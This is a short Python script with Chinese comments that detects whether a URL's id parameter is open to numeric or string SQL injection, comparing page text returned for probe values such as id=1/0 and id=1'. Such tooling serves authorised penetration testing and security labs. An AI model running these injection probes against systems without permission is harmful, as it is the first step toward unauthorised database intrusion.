import requests
from bs4 import BeautifulSoup


def get_user_input():
    """
    获取用户输入的目标 URL，并处理是否附带 --all 参数。
    返回：
        base_url (str): 目标 URL
        show_all (bool): 是否显示所有详细信息
    """
    user_input = input("请输入目标 URL（可附带 --all 参数）：")
    if "--all" in user_input:
        base_url = user_input.replace(" --all", "")
        show_all = True
    else:
        base_url = user_input
        show_all = False
    # 确保 URL 包含协议
    if not base_url.startswith(('http://', 'https://')):
        base_url = 'http://' + base_url
    return base_url, show_all


def send_request(url, show_all):
    """
    发送 GET 请求并处理响应。
    参数：
        url (str): 请求的 URL
        show_all (bool): 是否显示所有详细信息
    返回：
        text_content (str): 提取的文本内容，如果请求失败则返回 None
    """
    try:
        response = requests.get(url)
        if response.status_code == 200:
            soup = BeautifulSoup(response.text, 'html.parser')
            text_content = soup.get_text().strip().replace('\n', '').replace(' ', '')
            if show_all:
                print(f"请求 URL: {url}")
                print(f"提取的文本内容: {text_content}")
                print("-" * 50)
            return text_content
        else:
            if show_all:
                print(f"请求 {url} 失败，状态码: {response.status_code}")
    except requests.RequestException as e:
        if show_all:
            print(f"请求 {url} 发生错误: {e}")
    return None


def detect_sql_type():
    """
    检测 SQL 注入类型（数字型或字符型）。
    返回：
        sql_type (int or None): 检测到的 SQL 类型编号，0 表示数字型，1 表示字符型，未检测到则返回 None
    """
    base_url, show_all = get_user_input()
    params_list = ['id=1', 'id=1/0', "id=1'", "id=1''"]
    results = {}
    sql_type = None

    for param in params_list:
        url = f'{base_url}?{param}'
        text_content = send_request(url, show_all)
        if text_content is not None:
            results[param] = text_content

    # 比较 id=1 与 id=1/0 的结果
    if 'id=1' in results and 'id=1/0' in results and results['id=1'] != results['id=1/0']:
        sql_type = 0
        print("数字型")

    # 比较 id=1' 与 id=1'' 的结果
    elif "id=1'" in results and "id=1''" in results and results["id=1'"] != results["id=1''"]:
        sql_type = 1
        print("字符型")

    return sql_type

